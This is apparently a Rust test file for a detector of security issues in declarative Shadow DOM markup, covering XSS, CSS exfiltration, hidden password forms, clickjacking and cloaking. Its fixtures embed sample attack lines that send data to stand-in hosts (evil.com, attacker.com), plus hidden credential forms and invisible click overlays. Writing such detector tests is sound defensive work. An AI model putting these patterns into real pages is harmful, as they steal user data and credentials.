use super::*;

#[test]
fn test_no_api_no_issues() {
    let body = "<html><body><p>No shadow DOM here</p></body></html>";
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.is_empty());
}

#[test]
fn test_api_detected_shadowrootmode() {
    let body = r#"<template shadowrootmode="closed"><p>Shadow content</p></template>"#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::ApiDetected));
}

#[test]
fn test_api_detected_shadowroot() {
    let body = r#"<div shadowroot><p>Content</p></div>"#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::ApiDetected));
}

#[test]
fn test_xss_via_template_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <script>element.innerHTML = userInput;</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::XssViaTemplate));
}

#[test]
fn test_xss_via_template_with_sanitize_not_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <script>element.innerHTML = DOMPurify.sanitize(userInput);</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(!issues.contains(&DeclarativeShadowDomIssue::XssViaTemplate));
}

#[test]
fn test_style_exfiltration_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <style>@import url(evil.com/steal);</style>
            <script>fetch('https://attacker.com', {method: 'POST'});</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::StyleExfiltration));
}

#[test]
fn test_style_without_exfil_not_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <style>div { color: red; }</style>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(!issues.contains(&DeclarativeShadowDomIssue::StyleExfiltration));
}

#[test]
fn test_slot_injection_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <slot name="content"></slot>
            <script>slotElement.innerHTML = data;</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::SlotInjection));
}

#[test]
fn test_slot_injection_with_encode_not_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <slot name="content"></slot>
            <script>slotElement.innerHTML = encode(data);</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(!issues.contains(&DeclarativeShadowDomIssue::SlotInjection));
}

#[test]
fn test_open_mode_risk_detected_quoted() {
    let body = r#"<template shadowrootmode="open"><p>Content</p></template>"#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::OpenModeRisk));
}

#[test]
fn test_open_mode_risk_detected_unquoted() {
    let body = r#"<template shadowrootmode=open><p>Content</p></template>"#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::OpenModeRisk));
}

#[test]
fn test_closed_mode_no_open_risk() {
    let body = r#"<template shadowrootmode="closed"><p>Content</p></template>"#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(!issues.contains(&DeclarativeShadowDomIssue::OpenModeRisk));
}

#[test]
fn test_multiple_issues_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <style>@import url(evil.com);</style>
            <slot name="user"></slot>
            <script>
                slot.innerHTML = userInput;
                fetch('https://attacker.com', {method: 'POST', body: data});
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom(body);
    assert!(issues.contains(&DeclarativeShadowDomIssue::ApiDetected));
    assert!(issues.contains(&DeclarativeShadowDomIssue::XssViaTemplate));
    assert!(issues.contains(&DeclarativeShadowDomIssue::StyleExfiltration));
    assert!(issues.contains(&DeclarativeShadowDomIssue::SlotInjection));
    assert!(issues.contains(&DeclarativeShadowDomIssue::OpenModeRisk));
}

#[test]
fn test_severity_values() {
    assert_eq!(
        declarative_shadow_dom_severity(&DeclarativeShadowDomIssue::ApiDetected),
        2.0
    );
    assert_eq!(
        declarative_shadow_dom_severity(&DeclarativeShadowDomIssue::XssViaTemplate),
        8.0
    );
    assert_eq!(
        declarative_shadow_dom_severity(&DeclarativeShadowDomIssue::StyleExfiltration),
        7.0
    );
    assert_eq!(
        declarative_shadow_dom_severity(&DeclarativeShadowDomIssue::SlotInjection),
        6.5
    );
    assert_eq!(
        declarative_shadow_dom_severity(&DeclarativeShadowDomIssue::OpenModeRisk),
        5.5
    );
}

#[test]
fn test_operations_generation() {
    let issues = vec![
        DeclarativeShadowDomIssue::ApiDetected,
        DeclarativeShadowDomIssue::XssViaTemplate,
    ];
    let mut seq = 1;
    let ops = declarative_shadow_dom_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 3);
}

#[test]
fn test_display_formatting() {
    assert_eq!(
        DeclarativeShadowDomIssue::ApiDetected.to_string(),
        "api_detected"
    );
    assert_eq!(
        DeclarativeShadowDomIssue::XssViaTemplate.to_string(),
        "xss_via_template"
    );
    assert_eq!(
        DeclarativeShadowDomIssue::StyleExfiltration.to_string(),
        "style_exfiltration"
    );
    assert_eq!(
        DeclarativeShadowDomIssue::SlotInjection.to_string(),
        "slot_injection"
    );
    assert_eq!(
        DeclarativeShadowDomIssue::OpenModeRisk.to_string(),
        "open_mode_risk"
    );
}

// ========== NEW SECURITY ISSUE TESTS ==========

#[test]
fn test_security_empty_body() {
    let body = "";
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.is_empty());
}

#[test]
fn test_security_no_shadow_api() {
    let body = "<html><body><script>alert('hi')</script></body></html>";
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.is_empty());
}

#[test]
fn test_shadow_dom_xss_vector_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <script>alert('xss')</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomXssVector));
}

#[test]
fn test_shadow_dom_xss_vector_no_script() {
    let body = r#"
        <template shadowrootmode="open">
            <div>Safe content</div>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(!issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomXssVector));
}

#[test]
fn test_shadow_dom_style_injection_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <style>
                .leak { background-image: url(https://evil.com/steal?data=SECRET); }
            </style>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomStyleInjection));
}

#[test]
fn test_shadow_dom_style_injection_background_shorthand() {
    let body = r#"
        <template shadowrootmode="open">
            <style>
                .leak { background: url(https://evil.com/steal); }
            </style>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomStyleInjection));
}

#[test]
fn test_shadow_dom_style_injection_no_url() {
    let body = r#"
        <template shadowrootmode="open">
            <style>
                .safe { background: #fff; }
            </style>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(!issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomStyleInjection));
}

#[test]
fn test_shadow_dom_event_leaking_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <script>
                element.dispatchEvent(new CustomEvent('leak', {
                    composed: true,
                    bubbles: true,
                    detail: sensitiveData
                }));
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomEventLeaking));
}

#[test]
fn test_shadow_dom_event_leaking_no_spaces() {
    let body = r#"
        <template shadowrootmode="open">
            <script>
                element.dispatchEvent(new CustomEvent('leak', {
                    composed:true,
                    bubbles:true
                }));
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomEventLeaking));
}

#[test]
fn test_shadow_dom_event_leaking_only_composed() {
    let body = r#"
        <template shadowrootmode="open">
            <script>
                element.dispatchEvent(new CustomEvent('safe', { composed: true }));
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(!issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomEventLeaking));
}

#[test]
fn test_shadow_dom_form_hijack_detected_double_quotes() {
    let body = r#"
        <template shadowrootmode="open">
            <form style="display:none">
                <input type="password" name="pwd">
            </form>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomFormHijack));
}

#[test]
fn test_shadow_dom_form_hijack_detected_single_quotes() {
    let body = r#"
        <template shadowrootmode="open">
            <form style="visibility:hidden">
                <input type='password' name="pwd">
            </form>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomFormHijack));
}

#[test]
fn test_shadow_dom_form_hijack_visible_form() {
    let body = r#"
        <template shadowrootmode="open">
            <form>
                <input type="password" name="pwd">
            </form>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(!issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomFormHijack));
}

#[test]
fn test_shadow_dom_slot_exposure_token() {
    let body = r#"
        <template shadowrootmode="open">
            <slot name="auth-token"></slot>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomSlotExposure));
}

#[test]
fn test_shadow_dom_slot_exposure_password() {
    let body = r#"
        <template shadowrootmode="open">
            <slot name="user-password"></slot>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomSlotExposure));
}

#[test]
fn test_shadow_dom_slot_exposure_secret() {
    let body = r#"
        <template shadowrootmode="open">
            <slot name="api-secret"></slot>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomSlotExposure));
}

#[test]
fn test_shadow_dom_slot_exposure_safe_content() {
    let body = r#"
        <template shadowrootmode="open">
            <slot name="user-avatar"></slot>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(!issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomSlotExposure));
}

#[test]
fn test_shadow_dom_cloaking_bot_detection() {
    let body = r#"
        <template shadowrootmode="open">
            <script>
                if (navigator.userAgent.includes('bot')) {
                    // Show different content
                }
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomCloaking));
}

#[test]
fn test_shadow_dom_cloaking_crawler_detection() {
    let body = r#"
        <template shadowrootmode="open">
            <script>
                const ua = navigator.userAgent;
                if (ua.includes('crawler')) {
                    // Cloak content
                }
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomCloaking));
}

#[test]
fn test_shadow_dom_cloaking_no_user_agent_check() {
    let body = r#"
        <template shadowrootmode="open">
            <script>
                console.log('No cloaking here');
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(!issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomCloaking));
}

#[test]
fn test_shadow_dom_clickjacking_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <div style="opacity:0; position:absolute; z-index:9999;">
                <button>Click me</button>
            </div>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomClickjacking));
}

#[test]
fn test_shadow_dom_clickjacking_with_spaces() {
    let body = r#"
        <template shadowrootmode="open">
            <div style="opacity: 0; position: absolute; z-index: 9999;">
                <button>Click me</button>
            </div>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomClickjacking));
}

#[test]
fn test_shadow_dom_clickjacking_no_opacity() {
    let body = r#"
        <template shadowrootmode="open">
            <div style="position: absolute; z-index: 9999;">
                <button>Click me</button>
            </div>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(!issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomClickjacking));
}

#[test]
fn test_open_shadow_root_access_double_quotes() {
    let body = r#"<template shadowrootmode="open"><p>Content</p></template>"#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::OpenShadowRootAccess));
}

#[test]
fn test_open_shadow_root_access_single_quotes() {
    let body = r#"<template shadowrootmode='open'><p>Content</p></template>"#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::OpenShadowRootAccess));
}

#[test]
fn test_open_shadow_root_access_unquoted() {
    let body = r#"<template shadowrootmode=open><p>Content</p></template>"#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::OpenShadowRootAccess));
}

#[test]
fn test_open_shadow_root_access_closed_mode() {
    let body = r#"<template shadowrootmode="closed"><p>Content</p></template>"#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(!issues.contains(&DeclarativeShadowDomSecurityIssue::OpenShadowRootAccess));
}

#[test]
fn test_shadow_dom_csp_bypass_inline_script() {
    let body = r#"
        <template shadowrootmode="open">
            <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
            <script>alert('bypassed')</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomCspBypass));
}

#[test]
fn test_shadow_dom_csp_bypass_inline_style() {
    let body = r#"
        <template shadowrootmode="open">
            <div data-csp="strict">
                <p style="color: red;">Inline style</p>
            </div>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomCspBypass));
}

#[test]
fn test_shadow_dom_csp_bypass_no_csp_reference() {
    let body = r#"
        <template shadowrootmode="open">
            <script>console.log('hi')</script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(!issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomCspBypass));
}

#[test]
fn test_shadow_dom_mutation_spying_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <script>
                const observer = new MutationObserver((mutations) => {
                    // Spy on changes
                });
                observer.observe(this.shadowRoot, { childList: true });
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomMutationSpying));
}

#[test]
fn test_shadow_dom_mutation_spying_observe_method() {
    let body = r#"
        <template shadowrootmode="open">
            <script>
                const obs = new MutationObserver(callback);
                obs.observe(element.shadowRoot);
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomMutationSpying));
}

#[test]
fn test_shadow_dom_mutation_spying_no_shadow_root() {
    let body = r#"
        <template shadowrootmode="open">
            <script>
                const observer = new MutationObserver(callback);
                observer.observe(document.body, { childList: true });
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(!issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomMutationSpying));
}

#[test]
fn test_security_multiple_issues_detected() {
    let body = r#"
        <template shadowrootmode="open">
            <script>alert('xss')</script>
            <style>.leak { background: url(https://evil.com/data); }</style>
            <form style="display:none">
                <input type="password">
            </form>
            <slot name="api-token"></slot>
            <div style="opacity:0; position:absolute; z-index:999;">
                <button>Click</button>
            </div>
            <script>
                const ua = navigator.userAgent;
                if (ua.includes('bot')) {}
                const obs = new MutationObserver(() => {});
                obs.observe(this.shadowRoot);
            </script>
            <meta http-equiv="Content-Security-Policy" content="default">
            <script>
                element.dispatchEvent(new CustomEvent('e', {
                    composed: true,
                    bubbles: true
                }));
            </script>
        </template>
    "#;
    let issues = analyze_declarative_shadow_dom_security(body);
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomXssVector));
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomStyleInjection));
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomEventLeaking));
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomFormHijack));
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomSlotExposure));
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomCloaking));
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomClickjacking));
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::OpenShadowRootAccess));
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomCspBypass));
    assert!(issues.contains(&DeclarativeShadowDomSecurityIssue::ShadowDomMutationSpying));
}

#[test]
fn test_security_display_formatting() {
    assert_eq!(
        DeclarativeShadowDomSecurityIssue::ShadowDomXssVector.to_string(),
        "shadow_dom_xss_vector"
    );
    assert_eq!(
        DeclarativeShadowDomSecurityIssue::ShadowDomStyleInjection.to_string(),
        "shadow_dom_style_injection"
    );
    assert_eq!(
        DeclarativeShadowDomSecurityIssue::ShadowDomEventLeaking.to_string(),
        "shadow_dom_event_leaking"
    );
    assert_eq!(
        DeclarativeShadowDomSecurityIssue::ShadowDomFormHijack.to_string(),
        "shadow_dom_form_hijack"
    );
    assert_eq!(
        DeclarativeShadowDomSecurityIssue::ShadowDomSlotExposure.to_string(),
        "shadow_dom_slot_exposure"
    );
    assert_eq!(
        DeclarativeShadowDomSecurityIssue::ShadowDomCloaking.to_string(),
        "shadow_dom_cloaking"
    );
    assert_eq!(
        DeclarativeShadowDomSecurityIssue::ShadowDomClickjacking.to_string(),
        "shadow_dom_clickjacking"
    );
    assert_eq!(
        DeclarativeShadowDomSecurityIssue::OpenShadowRootAccess.to_string(),
        "open_shadow_root_access"
    );
    assert_eq!(
        DeclarativeShadowDomSecurityIssue::ShadowDomCspBypass.to_string(),
        "shadow_dom_csp_bypass"
    );
    assert_eq!(
        DeclarativeShadowDomSecurityIssue::ShadowDomMutationSpying.to_string(),
        "shadow_dom_mutation_spying"
    );
}

#[test]
fn test_security_severity_values() {
    assert_eq!(
        declarative_shadow_dom_security_severity(
            &DeclarativeShadowDomSecurityIssue::ShadowDomXssVector
        ),
        9.0
    );
    assert_eq!(
        declarative_shadow_dom_security_severity(
            &DeclarativeShadowDomSecurityIssue::ShadowDomStyleInjection
        ),
        7.5
    );
    assert_eq!(
        declarative_shadow_dom_security_severity(
            &DeclarativeShadowDomSecurityIssue::ShadowDomEventLeaking
        ),
        6.0
    );
    assert_eq!(
        declarative_shadow_dom_security_severity(
            &DeclarativeShadowDomSecurityIssue::ShadowDomFormHijack
        ),
        8.5
    );
    assert_eq!(
        declarative_shadow_dom_security_severity(
            &DeclarativeShadowDomSecurityIssue::ShadowDomSlotExposure
        ),
        7.0
    );
    assert_eq!(
        declarative_shadow_dom_security_severity(
            &DeclarativeShadowDomSecurityIssue::ShadowDomCloaking
        ),
        5.5
    );
    assert_eq!(
        declarative_shadow_dom_security_severity(
            &DeclarativeShadowDomSecurityIssue::ShadowDomClickjacking
        ),
        8.0
    );
    assert_eq!(
        declarative_shadow_dom_security_severity(
            &DeclarativeShadowDomSecurityIssue::OpenShadowRootAccess
        ),
        6.5
    );
    assert_eq!(
        declarative_shadow_dom_security_severity(
            &DeclarativeShadowDomSecurityIssue::ShadowDomCspBypass
        ),
        8.5
    );
    assert_eq!(
        declarative_shadow_dom_security_severity(
            &DeclarativeShadowDomSecurityIssue::ShadowDomMutationSpying
        ),
        5.0
    );
}

#[test]
fn test_security_severity_range() {
    let issues = vec![
        DeclarativeShadowDomSecurityIssue::ShadowDomXssVector,
        DeclarativeShadowDomSecurityIssue::ShadowDomStyleInjection,
        DeclarativeShadowDomSecurityIssue::ShadowDomEventLeaking,
        DeclarativeShadowDomSecurityIssue::ShadowDomFormHijack,
        DeclarativeShadowDomSecurityIssue::ShadowDomSlotExposure,
        DeclarativeShadowDomSecurityIssue::ShadowDomCloaking,
        DeclarativeShadowDomSecurityIssue::ShadowDomClickjacking,
        DeclarativeShadowDomSecurityIssue::OpenShadowRootAccess,
        DeclarativeShadowDomSecurityIssue::ShadowDomCspBypass,
        DeclarativeShadowDomSecurityIssue::ShadowDomMutationSpying,
    ];
    for issue in &issues {
        let sev = declarative_shadow_dom_security_severity(issue);
        assert!(
            sev >= 3.0 && sev <= 9.0,
            "Severity {} out of range for {:?}",
            sev,
            issue
        );
    }
}

#[test]
fn test_security_operations_generation() {
    let issues = vec![
        DeclarativeShadowDomSecurityIssue::ShadowDomXssVector,
        DeclarativeShadowDomSecurityIssue::ShadowDomFormHijack,
        DeclarativeShadowDomSecurityIssue::OpenShadowRootAccess,
    ];
    let mut seq = 1;
    let ops = declarative_shadow_dom_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 4);
}

#[test]
fn test_security_operations_empty_list() {
    let issues = vec![];
    let mut seq = 10;
    let ops = declarative_shadow_dom_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 10);
}
